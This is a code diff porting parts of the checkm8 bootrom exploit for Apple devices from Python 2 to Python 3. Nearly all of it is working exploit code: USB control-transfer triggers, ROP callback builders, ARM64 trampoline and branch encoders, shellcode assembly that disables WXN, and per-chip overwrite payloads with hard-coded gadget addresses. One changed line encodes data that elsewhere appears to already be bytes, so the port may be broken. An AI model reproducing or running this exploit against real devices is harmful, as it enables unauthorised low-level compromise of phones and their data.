@@ -33,7 +33,8 @@ def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex,
   request_timeout = int(timeout) if timeout >= 1 else 0
   start = time.time()
   never_free_device = device
-  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
+  data_bytes = data.encode()
+  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data_bytes)) + data_bytes)
   transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
   assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0
 
@@ -51,10 +52,10 @@ def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wInd
     pass
 
 def usb_rop_callbacks(address, func_gadget, callbacks):
-  data = ''
+  data = b''
   for i in range(0, len(callbacks), 5):
-    block1 = ''
-    block2 = ''
+    block1 = b''
+    block2 = b''
     for j in range(5):
       address += 0x10
       if j == 4:
@@ -72,16 +73,30 @@ def usb_rop_callbacks(address, func_gadget, callbacks):
 
 # TODO: assert we are within limits
 def asm_arm64_branch(src, dest):
+  # 确保 src 和 dest 是整数
+  src = int(src)
+  dest = int(dest)
+
+  # 计算偏移量，使用整数除法
+  offset = (src - dest) if src > dest else (dest - src)
+  imm = offset // 4
+
+  # 根据条件设置指令的高24位
   if src > dest:
-    value = 0x18000000 - (src - dest) / 4
+      value = 0x18000000 - imm
   else:
-    value = 0x14000000 + (dest - src) / 4
+      value = 0x14000000 + imm
+
+  # 确保 value 是 32位无符号整数
+  if not (0 <= value <= 0xFFFFFFFF):
+      raise ValueError("Calculated value is out of 32-bit unsigned integer range")
+
   return struct.pack('<I', value)
 
 # TODO: check if start offset % 4 would break it
 # LDR X7, [PC, #OFFSET]; BR X7
 def asm_arm64_x7_trampoline(dest):
-  return '47000058E0001FD6'.decode('hex') + struct.pack('<Q', dest)
+  return bytes.fromhex('47000058E0001FD6') + struct.pack('<Q', dest)
 
 # THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]
 # THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]
@@ -374,7 +389,7 @@ def payload(cpid):
     t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)
     assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
-    t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
+    t8010_shellcode = t8010_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
     assert len(t8010_shellcode) <= 0x400
     return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
   if cpid == 0x8011:
@@ -476,13 +491,13 @@ def all_exploit_configs():
   t8011_nop_gadget = 0x10000CD0C
   t8015_nop_gadget = 0x10000A9C4
 
-  s5l8947x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
-  s5l895xx_overwrite = '\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
-  t800x_overwrite    = '\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
-  s5l8960x_overwrite = '\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
-  t8010_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
-  t8011_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
-  t8015_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
+  s5l8947x_overwrite = b'\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
+  s5l895xx_overwrite = b'\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
+  t800x_overwrite    = b'\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
+  s5l8960x_overwrite = b'\0' * 0x580 + struct.pack('<32xQ8x', 0x180380000)
+  t8010_overwrite    = b'\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8011_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8015_overwrite    = b'\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
   return [
     DeviceConfig('iBoot-1458.2',          0x8947,  626, s5l8947x_overwrite, None, None), # S5L8947 (DFU loop)     1.97 seconds
